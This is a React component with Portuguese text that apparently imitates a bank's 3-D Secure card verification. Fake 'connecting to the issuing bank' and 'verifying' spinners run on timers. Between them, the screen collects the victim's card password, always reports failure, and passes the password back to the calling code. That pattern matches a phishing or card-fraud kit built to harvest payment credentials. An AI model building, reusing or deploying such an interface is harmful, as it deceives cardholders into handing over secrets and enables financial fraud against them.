import { useState, useEffect } from "react";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Loader2, ShieldCheck } from "lucide-react";

interface ThreeDSModalProps {
  open: boolean;
  onComplete: (approved: boolean, password?: string) => void;
}

const ThreeDSModal = ({ open, onComplete }: ThreeDSModalProps) => {
  const [step, setStep] = useState<"loading" | "input" | "verifying">("loading");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");

  useEffect(() => {
    if (open) {
      setStep("loading");
      setPassword("");
      setError("");
      const timer = setTimeout(() => setStep("input"), 2000);
      return () => clearTimeout(timer);
    }
  }, [open]);

  const handleVerify = () => {
    if (!password.trim()) {
      setError("Digite a senha do cartão");
      return;
    }
    setStep("verifying");
    setTimeout(() => {
      onComplete(false, password);
    }, 2500);
  };

  return (
    <Dialog open={open} onOpenChange={() => {}}>
      <DialogContent className="sm:max-w-sm" onInteractOutside={(e) => e.preventDefault()}>
        <DialogHeader>
          <DialogTitle className="flex items-center gap-2 text-base">
            <ShieldCheck className="h-5 w-5 text-primary" />
            Verificação de Segurança 3DS
          </DialogTitle>
          <DialogDescription className="text-xs">
            Autenticação solicitada pelo banco emissor do cartão
          </DialogDescription>
        </DialogHeader>

        {step === "loading" && (
          <div className="flex flex-col items-center gap-3 py-8">
            <Loader2 className="h-8 w-8 animate-spin text-primary" />
            <p className="text-sm text-muted-foreground">Conectando ao banco emissor...</p>
          </div>
        )}

        {step === "input" && (
          <div className="space-y-4 py-2">
            <div className="rounded-lg bg-muted/50 p-3 text-xs text-muted-foreground text-center">
              Para sua segurança, informe a senha cadastrada no banco emissor do cartão.
            </div>
            <div>
              <Input
                type="password"
                placeholder="Senha do cartão"
                value={password}
                onChange={(e) => { setPassword(e.target.value); setError(""); }}
                className={error ? "border-destructive" : ""}
                autoFocus
              />
              {error && <p className="mt-1 text-xs text-destructive">{error}</p>}
            </div>
            <div className="flex gap-2">
              <Button variant="outline" className="flex-1" onClick={() => onComplete(false)}>
                Cancelar
              </Button>
              <Button className="flex-1" onClick={handleVerify}>
                Confirmar
              </Button>
            </div>
          </div>
        )}

        {step === "verifying" && (
          <div className="flex flex-col items-center gap-3 py-8">
            <Loader2 className="h-8 w-8 animate-spin text-primary" />
            <p className="text-sm text-muted-foreground">Verificando autenticação...</p>
          </div>
        )}
      </DialogContent>
    </Dialog>
  );
};

export default ThreeDSModal;
